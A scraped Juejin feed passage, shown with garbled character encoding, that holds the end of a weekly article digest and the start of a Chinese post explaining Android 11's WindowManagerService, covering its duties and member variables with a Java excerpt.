<p>æœ¬æ–‡å›´ç»•ä¾›åº”é“¾ç³»ç»Ÿä¸­çš„Webæ‰“å°æ–¹æ¡ˆå±•å¼€ã€‚è°ƒç ”äº†åŸºäºDOMã€å¯è§†åŒ–æ¨¡æ¿ã€æœ¬åœ°æ‰“å°æ§ä»¶ä¸‰ç±»ä¸»æµæ–¹æ¡ˆå¹¶å¯¹æ¯”ã€‚é‡ç‚¹åˆ†æwindow.printï¼Œç»™å‡ºæŒ‡å®šåŒºåŸŸä¸æ‰¹é‡æ‰“å°æ€è·¯ï¼Œä»‹ç»æ ¸å¿ƒCSSæ‰“å°é…ç½®ï¼ŒæŒ‡å‡ºå…¶ä»æ˜¯é«˜æ€§ä»·æ¯”æ–¹æ¡ˆã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7599586891084726306" target="_blank" title="https://juejin.cn/post/7599586891084726306">æˆ‘æ¥æ‰‹äº†ä¸€ä¸ª 10 å¹´å‰çš„ jQuery è€é¡¹ç›®ï¼Œç”¨ Web Components ç»™å®ƒç»­äº†å‘½</a><a href="https://juejin.cn/user/3878732754331096/posts" target="_blank" title="https://juejin.cn/user/3878732754331096/posts">@ErpanOmer</a></p>
<blockquote>
<p>ä½œè€…æ¥æ‰‹ 2015 å¹´ä¸Šçº¿çš„ jQuery è€ CRM é¡¹ç›®ï¼Œéœ€æ·»åŠ  AI æ™ºèƒ½å®¢æœåŠŸèƒ½ã€‚å› ä¸šåŠ¡æ—¶é—´ç´§ï¼Œé€‰æ‹© Web Componentsï¼Œåˆ©ç”¨å…¶ Shadow DOM è§£å†³ CSS æ±¡æŸ“ã€‚ä»‹ç»ç»„ä»¶å®šä¹‰ä¸ä½¿ç”¨ï¼Œè¯¥æ–¹æ¡ˆä¾µå…¥æ€§é›¶ã€æ¡†æ¶æ— å…³ã€å¯æ¸è¿›è¿ç§»ï¼Œè¿˜ç»™å‡ºé¿å‘æŒ‡å—ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7600581247020253193" target="_blank" title="https://juejin.cn/post/7600581247020253193">æ‰‹æŠŠæ‰‹æ•™ä½ ä½¿ç”¨LangChainï¼ˆå‰ç«¯å¼€å‘ç¨‹åºå‘˜ç‰ˆï¼‰</a><a href="https://juejin.cn/user/2788017220891128/posts" target="_blank" title="https://juejin.cn/user/2788017220891128/posts">@å‰ç«¯å°è±†</a></p>
<blockquote>
<p>æœ¬æ–‡æ˜¯é¢å‘å‰ç«¯å¼€å‘è€…çš„LangChainæ•™ç¨‹ã€‚å…ˆä»‹ç»å‰ç½®å‡†å¤‡ï¼Œæ¥ç€ä»ç¯å¢ƒæ­å»ºã€æ ¸å¿ƒåŠŸèƒ½å®æ“ã€å‰ç«¯é¡¹ç›®é›†æˆå±•å¼€æ•™å­¦ï¼Œè¿˜ç»™å‡ºé¿å‘æŒ‡å—ï¼Œæœ€åæŒ‡æ˜è¿›é˜¶æ–¹å‘ï¼ŒåŠ©å‰ç«¯å¼€å‘è€…ç”¨JS/TSé›†æˆAIèƒ½åŠ›ï¼Œæ‰“é€ æ™ºèƒ½åº”ç”¨ã€‚</p>
</blockquote>
<h3 data-id="heading-2">åç«¯</h3>
<p><a href="https://juejin.cn/post/7600238071038197769" target="_blank" title="https://juejin.cn/post/7600238071038197769">Clawdbot å®Œæ•´å¯¹æ¥é£ä¹¦æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ­å»ºä½ çš„ä¸“å± AI åŠ©æ‰‹</a><a href="https://juejin.cn/user/993614242266077/posts" target="_blank" title="https://juejin.cn/user/993614242266077/posts">@BingoGo</a></p>
<blockquote>
<p>æœ¬æ–‡æ˜¯ Moltbotï¼ˆåŸ Clawdbotï¼‰å¯¹æ¥é£ä¹¦çš„æ•™ç¨‹ã€‚å…ˆä»‹ç»åœ¨ Linux ç³»ç»Ÿå®‰è£…ï¼ŒåŒ…æ‹¬ Gitã€Node.js åŠ Moltbot å®‰è£…æ­¥éª¤ï¼Œè¿˜æåŠæŸ¥çœ‹æœåŠ¡å’Œè®¿é—® Web UI é¢æ¿æ–¹æ³•ã€‚æ¥ç€è¯´æ˜å¯¹æ¥é£ä¹¦æµç¨‹ï¼Œå«æ’ä»¶å®‰è£…ã€å‚æ•°é…ç½®ã€æƒé™è®¾ç½®ç­‰ï¼Œå®Œæˆåå¯ä¸æœºå™¨äººå¯¹è¯ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7600994087588053011" target="_blank" title="https://juejin.cn/post/7600994087588053011">Agent Skillså·¥ä½œæµï¼šä»å…¥é—¨åˆ°å®æˆ˜</a><a href="https://juejin.cn/user/694547077666606/posts" target="_blank" title="https://juejin.cn/user/694547077666606/posts">@é›¨ä¸­é£˜è¡çš„è®°å¿†</a></p>
<blockquote>
<p>æœ¬æ–‡å›´ç»•Agent Skillså·¥ä½œæµå±•å¼€ï¼Œå…ˆä»‹ç»æ ¸å¿ƒæ¦‚å¿µä¸æ¶æ„è®¾è®¡ï¼Œæ¥ç€é˜è¿°æ ¸å¿ƒç»„ä»¶ã€åŸºç¡€æŠ€èƒ½å®ç°ï¼Œè¿˜æ¶‰åŠäº¤äº’æœºåˆ¶ã€å¤šAgentåä½œã€‚ä»¥æ™ºèƒ½æ•°æ®åˆ†æç³»ç»Ÿä¸ºä¾‹å®æˆ˜ï¼Œç»™å‡ºéƒ¨ç½²ã€æµ‹è¯•ç­–ç•¥ä¸è®¾è®¡åŸåˆ™ï¼Œå±•ç°å…¶ç»“åˆAIä¸ä¼ ç»Ÿå¼€å‘çš„ä¼˜åŠ¿ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7599237603976134699" target="_blank" title="https://juejin.cn/post/7599237603976134699">æ€§èƒ½å‘Šè­¦æƒŠå››åº§ ç¥å™¨å‡ºæ‰‹ä¼æ¶é¾™</a><a href="https://juejin.cn/user/2586510420095944/posts" target="_blank" title="https://juejin.cn/user/2586510420095944/posts">@Hello_world_</a></p>
<blockquote>
<p>2025å¹´12æœˆ29æ—¥æœåŠ¡å‡ºç°CPUé˜ˆå€¼å‘Šè­¦ï¼Œä½œè€…ä»ä»£ç ã€æµé‡ã€JVMç»´åº¦æ’æŸ¥ï¼Œæœªæ‰¾åˆ°æ ¹æœ¬åŸå› ã€‚åç”¨ç¥å™¨Arthasåˆ†æï¼Œå‘ç°æ˜¯ä¸šåŠ¡ä»£ç ä¸­åºåˆ—åŒ–/ååºåˆ—åŒ–ä»£ç ä½¿ç”¨ä¸å½“æ‰€è‡´ã€‚ä¿®æ”¹ä»£ç åï¼ŒCPUåˆ©ç”¨ç‡å¤§å¹…é™ä½ã€‚</p>
</blockquote>
<h3 data-id="heading-3">Android</h3>
<p><a href="https://juejin.cn/post/7598737609494855699" target="_blank" title="https://juejin.cn/post/7598737609494855699">è¡€å‹é£™å‡ï¼ŒFlutter &amp; Dart 2025 å¹´åº¦å·¨å‘å›é¡¾</a><a href="https://juejin.cn/user/817692379985752/posts" target="_blank" title="https://juejin.cn/user/817692379985752/posts">@æ‹çŒ«deå°éƒ­</a></p>
<blockquote>
<p>æœ¬æ–‡å…ˆæåŠ Google å‘å¸ƒçš„ Flutter &amp; Dart 2025 é«˜å…‰å›é¡¾ï¼Œéšåç€é‡ç›˜ç‚¹è¯¥å¹´ Flutter ç»å…¸å·¨å‘ï¼Œå¦‚å®åŠŸèƒ½æš‚åœã€çº¿ç¨‹åˆå¹¶é—®é¢˜ç­‰ï¼Œå…¶ä¸­è¶…åŠæ•°ä¸º iOS ç›¸å…³é—®é¢˜ï¼Œè™½å®˜æ–¹ç§¯æè§£å†³ï¼Œä½†å¹³å°å‡çº§å‘å¤šã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7600787795478134830" target="_blank" title="https://juejin.cn/post/7600787795478134830">Composeä¸­çš„IntrinsicSizeå®æˆ˜æŒ‡å—</a><a href="https://juejin.cn/user/2788017216685784/posts" target="_blank" title="https://juejin.cn/user/2788017216685784/posts">@ç¨€æœ‰çŒ¿è¯‰</a></p>
<blockquote>
<p>æœ¬æ–‡å›´ç»•Composeä¸­çš„IntrinsicSizeå±•å¼€ï¼Œä»¥æ„å»ºé‡å å¡ç‰‡å¼UIä¸ºä¾‹ï¼ŒæŒ‡å‡ºweightä¿®é¥°ç¬¦å¯¼è‡´å¸ƒå±€é—®é¢˜çš„åŸå› ï¼Œä»‹ç»äº†IntrinsicSizeæ‰“ç ´å¾ªç¯ä¾èµ–çš„åŸç†ï¼Œåˆ—ä¸¾å¸¸è§ç”¨ä¾‹ï¼Œè¿˜æåŠæ€§èƒ½æ³¨æ„äº‹é¡¹ï¼Œå¼ºè°ƒå…¶å¯¹å¤æ‚UIæ„å»ºçš„é‡è¦æ€§ã€‚</p>
</blockquote>
<h3 data-id="heading-4">äººå·¥æ™ºèƒ½</h3>
<p><a href="https://juejin.cn/post/7599970244786864191" target="_blank" title="https://juejin.cn/post/7599970244786864191">ä»é›¶å¼€å§‹æ­å»ºéƒ¨ç½² Moltbot/Clawdbot å®Œæ•´æ”»ç•¥</a><a href="https://juejin.cn/user/4388906150921614/posts" target="_blank" title="https://juejin.cn/user/4388906150921614/posts">@å‡ºé—¨ä¸ä¸‹é›¨</a></p>
<blockquote>
<p>æœ¬æ–‡æ˜¯ Moltbot/Clawdbot æ­å»ºéƒ¨ç½²æ”»ç•¥ã€‚ä»‹ç»å…¶ä¸ºæ”¯æŒå¤šæ¨¡å‹ã€å¤šå¹³å°çš„ AI åŠ©æ‰‹æ¡†æ¶ï¼Œé˜è¿°ç³»ç»Ÿè¦æ±‚ï¼Œç»™å‡º Windowsã€Mac å®‰è£…æ­¥éª¤ï¼Œæ¶µç›–é¦–æ¬¡é…ç½®ã€å¸¸ç”¨æŒ‡ä»¤ã€æ—¥å¸¸ç»´æŠ¤ã€æ•…éšœæ’é™¤åŠè¿›é˜¶é…ç½®å†…å®¹ï¼Œè¿˜è§£ç­”å¸¸è§é—®é¢˜ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7599604510366236710" target="_blank" title="https://juejin.cn/post/7599604510366236710">Agent Skills å‚»ç“œå¼æ•™ç¨‹ï¼Œ26 å¹´æœ€ç« AI æŠ€æœ¯å°±è¿™ï¼Ÿ</a><a href="https://juejin.cn/user/2444938365386621/posts" target="_blank" title="https://juejin.cn/user/2444938365386621/posts">@ç¨‹åºå‘˜é±¼çš®</a></p>
<blockquote>
<p>æœ¬æ–‡å›´ç»• Agent Skills å±•å¼€ï¼Œå®ƒæ˜¯ Anthropic æ¨å‡ºçš„å¼€æ”¾æ ‡å‡†ï¼Œå¯è®© AI å­¦ä¹ ä¸“ä¸šæŠ€èƒ½ã€‚ä»‹ç»äº†å…¥é—¨å®æˆ˜ã€å†…éƒ¨åŸç†ã€è·¨å·¥å…·ä½¿ç”¨ã€åˆ›å»ºæ–¹æ³•ï¼Œè¿˜å¯¹æ¯”äº†ä¸ MCPã€æ–œæ å‘½ä»¤åŒºåˆ«ï¼Œå› å…¶å¼€æ”¾å¤ç”¨ä¸”é™ä½é—¨æ§›è€Œå¤§ç«ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7598918127578972194" target="_blank" title="https://juejin.cn/post/7598918127578972194">Agent Skillså®Œå…¨æŒ‡å—ï¼šæ ¸å¿ƒæ¦‚å¿µä¸¨è®¾è®¡æ¨¡å¼ä¸¨å®æˆ˜ä»£ç </a><a href="https://juejin.cn/user/3140624091453053/posts" target="_blank" title="https://juejin.cn/user/3140624091453053/posts">@å¤§æ¨¡å‹çœŸå¥½ç©</a></p>
<blockquote>
<p>æœ¬æ–‡å›´ç»• Agent Skills å±•å¼€ï¼Œå®ƒæ˜¯æ¸è¿›å¼æŠ«éœ²çš„æç¤ºè¯ç®¡ç†æœºåˆ¶ï¼Œèƒ½é™ä½ Token æ¶ˆè€—ã€‚ä»¥ Claude Code ä¸ºä¾‹ï¼Œä»‹ç»å®‰è£…ã€ä½¿ç”¨åŠè¿›é˜¶æ–¹æ³•ã€‚è¿˜å¯¹æ¯”äº†ä¸ MCP çš„åŒºåˆ«ï¼ŒåŠ©å¼€å‘è€…æ„å»ºå¼ºå¤§æ™ºèƒ½ä½“ã€‚</p>
</blockquote>
<h2 data-id="heading-5">ğŸ“– æŠ•ç¨¿ä¸“åŒº</h2>
<blockquote>
<p>å¤§å®¶å¯ä»¥åœ¨è¯„è®ºåŒºæ¨èè®¤ä¸ºä¸é”™çš„æ–‡ç« ï¼Œå¹¶é™„ä¸Šé“¾æ¥å’Œæ¨èç†ç”±ï¼Œæœ‰æœºä¼šå‘ˆç°åœ¨ä¸‹ä¸€æœŸã€‚æ–‡ç« åˆ›å»ºæ—¥æœŸå¿…é¡»åœ¨ä¸‹æœŸæ˜é‡‘ä¸€å‘¨å‘å¸ƒå‰ä¸€å‘¨ä»¥å†…ï¼›å¯ä»¥æ¨èè‡ªå·±çš„æ–‡ç« ã€ä¹Ÿå¯ä»¥æ¨èä»–äººçš„æ–‡ç« ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WMSæºç è§£æ]]></title>    <link>https://juejin.cn/post/7603185231801139226</link>    <guid>https://juejin.cn/post/7603185231801139226</guid>    <pubDate>2026-02-05T08:32:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603185231801139226" data-draft-id="7600953879501078579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WMSæºç è§£æ"/> <meta itemprop="keywords" content="æºç "/> <meta itemprop="datePublished" content="2026-02-05T08:32:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XRay"/> <meta itemprop="url" content="https://juejin.cn/user/3966693685869288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WMSæºç è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3966693685869288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XRay
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:32:33.000Z" title="Thu Feb 05 2026 08:32:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€. WMS</h2>
<p>WMS æ˜¯ Android ä¸­å¾ˆé‡è¦çš„ä¸€ä¸ªæœåŠ¡ï¼Œå®ƒæ˜¯ WindowManager çš„ç®¡ç†è€…ï¼ŒWMS æ— è®ºå¯¹äºåº”ç”¨å¼€å‘è¿˜æ˜¯ Framework å¼€å‘æ¥è¯´éƒ½æ˜¯é‡è¦çš„çŸ¥è¯†ç‚¹ï¼Œå…¶åŸå› æ˜¯å› ä¸º WMS æœ‰å¾ˆå¤šèŒè´£ï¼Œæ¯ä¸ªèŒè´£éƒ½ä¼šæ¶‰åŠé‡è¦ä¸”å¤æ‚çš„ç³»ç»Ÿï¼Œè¿™ä½¿å¾— WMS å°±åƒä¸€ä¸ªåå­—è·¯å£çš„äº¤é€šç¯ä¸€æ ·ï¼Œæ²¡æœ‰äº†è¿™ä¸ªäº¤é€šç¯ï¼Œåå­—è·¯å£å°±æ— æ³•æ­£å¸¸é€šè½¦ã€‚</p>
<p>WMS çš„èŒè´£ç®€å•æ¥è¯´ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>çª—å£ç®¡ç†ï¼šWMS æ˜¯çª—å£çš„ç®¡ç†è€…ï¼Œå®ƒè´Ÿè´£çª—å£çš„å¯åŠ¨ã€æ·»åŠ å’Œåˆ é™¤ã€‚å¦å¤–çª—å£çš„å¤§å°å’Œå±‚çº§ä¹Ÿæ˜¯ç”± WMS è¿›è¡Œç®¡ç†çš„ã€‚</li>
<li>çª—å£åŠ¨ç”»ï¼šçª—å£åŠ¨ç”»ç”± WMS çš„åŠ¨ç”»å­ç³»ç»Ÿæ¥è´Ÿè´£ï¼ŒåŠ¨ç”»å­ç³»ç»Ÿçš„ç®¡ç†è€…ä¸º WindowAnimatorã€‚</li>
<li>è¾“å…¥ç³»ç»Ÿä¸­è½¬ç«™ï¼šé€šè¿‡å¯¹çª—å£çš„è§¦æ‘¸ä»è€Œäº§ç”Ÿè§¦æ‘¸äº‹ä»¶ï¼ŒInputManagerServiceï¼ˆIMSï¼‰ä¼šå¯¹è§¦æ‘¸äº‹ä»¶è¿›è¡Œå¤„ç†ï¼Œå®ƒä¼šå¯»æ‰¾ä¸€ä¸ªæœ€åˆé€‚çš„çª—å£æ¥å¤„ç†è§¦æ‘¸åé¦ˆä¿¡æ¯ï¼ŒWMS æ˜¯çª—å£çš„ç®¡ç†è€…ï¼Œå®ƒä½œä¸ºè¾“å…¥ç³»ç»Ÿçš„ä¸­è½¬ç«™å†åˆé€‚ä¸è¿‡äº†ã€‚</li>
<li>Surface ç®¡ç†ï¼šçª—å£ä¸å…·å¤‡ç»˜åˆ¶åŠŸèƒ½ï¼Œå› æ­¤æ¯ä¸ªçª—å£éƒ½éœ€è¦æœ‰ä¸€å— Surface æ¥ä¾›è‡ªå·±ç»˜åˆ¶ï¼Œä¸ºæ¯ä¸ªçª—å£åˆ†é… Surface æ˜¯ç”± WMS æ¥å®Œæˆçš„ã€‚</li>
</ol>
<p>WMSçš„èŒè´£å¯ä»¥ç®€å•æ€»ç»“ä¸ºä¸‹å›¾ï¼š
<img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d32fd0132c804c3c885a8849e73bb679~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=871&amp;h=448&amp;s=23841&amp;e=png&amp;b=ffffff" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">äºŒ. WMS çš„é‡è¦æˆå‘˜</h2>
<p>WMS çš„éƒ¨åˆ†æˆå‘˜å˜é‡å¦‚ä¸‹ï¼Œæœ¬æ–‡æºç åŸºäº Android 11.0ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IWindowManager</span>.Stub
        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watchdog</span>.Monitor, WindowManagerPolicy.WindowManagerFuncs {

    WindowManagerPolicy mPolicy;
    <span class="hljs-keyword">final</span> ArraySet&lt;Session&gt; mSessions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>&lt;&gt;();
    <span class="hljs-keyword">final</span> HashMap&lt;IBinder, WindowState&gt; mWindowMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Windows that are being resized. Used so we can tell the client about
    * the resize after closing the transaction in which we resized the
    * underlying surface.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mResizingWindows = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Windows whose animations have ended and now must be removed.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mPendingRemove = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Used when processing mPendingRemove to avoid working on the original array.
    */</span>
    WindowState[] mPendingRemoveTmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowState</span>[<span class="hljs-number">20</span>];

    <span class="hljs-comment">/**
    * Windows whose surface should be destroyed.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mDestroySurface = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">/**
    * Windows with a preserved surface waiting to be destroyed. These windows
    * are going through a surface change. We keep the old surface around until
    * the first frame on the new surface finishes drawing.
    */</span>
    <span class="hljs-keyword">final</span> ArrayList&lt;WindowState&gt; mDestroyPreservedSurface = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">final</span> InputManagerService mInputManager;

    <span class="hljs-keyword">final</span> WindowAnimator mAnimator;

    <span class="hljs-keyword">final</span> <span class="hljs-type">H</span> <span class="hljs-variable">mH</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">H</span>();
}
</code></pre>
<h3 data-id="heading-2">1. mPolicyï¼šWindowManagerPolicy</h3>
<p>WindowManagerPolicyï¼ˆWMPï¼‰ç±»å‹çš„å˜é‡ã€‚WindowManagerPolicy æ˜¯çª—å£ç®¡ç†ç­–ç•¥çš„æ¥å£ç±»ï¼Œç”¨æ¥å®šä¹‰ä¸€ä¸ªçª—å£ç­–ç•¥æ‰€è¦éµå¾ªçš„é€šç”¨è§„èŒƒï¼Œå¹¶æä¾›äº† WindowManager æ‰€æœ‰çš„ç‰¹å®šçš„ UI è¡Œä¸ºã€‚å®ƒçš„å…·ä½“å®ç°ç±»ä¸º PhoneWindowManager ï¼Œè¿™ä¸ªå®ç°ç±»åœ¨ WMS åˆ›å»ºæ—¶è¢«åˆ›å»ºã€‚WMP å…è®¸å®šåˆ¶çª—å£å±‚çº§å’Œç‰¹æ®Šçª—å£ç±»å‹ä»¥åŠå…³é”®çš„è°ƒåº¦å’Œå¸ƒå±€ã€‚</p>
<h3 data-id="heading-3">2. mSessionsï¼šArraySet&lt;Session&gt;</h3>
<p>ArraySet&lt;Session&gt; ç±»å‹çš„å˜é‡ã€‚å®ƒä¸»è¦ç”¨äºè¿›ç¨‹é—´é€šä¿¡ï¼Œå…¶ä»–çš„åº”ç”¨ç¨‹åºè¿›ç¨‹æƒ³è¦å’Œ WMS è¿›ç¨‹è¿›è¡Œé€šä¿¡å°±éœ€è¦ç»è¿‡ Session ï¼Œå¹¶ä¸”æ¯ä¸ªåº”ç”¨ç¨‹åºè¿›ç¨‹éƒ½ä¼šå¯¹åº”ä¸€ä¸ª Session ï¼ŒWMS ä¿å­˜è¿™äº› Session ç”¨æ¥è®°å½•æ‰€æœ‰å‘ WMS æå‡ºçª—å£ç®¡ç†æœåŠ¡çš„å®¢æˆ·ç«¯ã€‚</p>
<h3 data-id="heading-4">3. mWindowMapï¼šHashMap&lt;IBinder, WindowState&gt;</h3>
<p>mWindowMap æ˜¯ä¸€ä¸ª HashMapï¼Œkey çš„ç±»å‹ä¸º IBinder ï¼Œvalue çš„ç±»å‹ä¸º WindowState ã€‚WindowState ç”¨äºä¿å­˜çª—å£çš„ä¿¡æ¯ï¼Œåœ¨ WMS ä¸­å®ƒç”¨æ¥æè¿°ä¸€ä¸ªçª—å£ã€‚ç»¼ä¸Šå¾—å‡ºç»“è®ºï¼ŒmWindowMap å°±æ˜¯ç”¨æ¥ä¿å­˜ WMS ä¸­å„ç§çª—å£çš„é›†åˆã€‚</p>
<h3 data-id="heading-5">4.mResizingWindowsï¼šArrayList&lt;WindowState&gt;</h3>
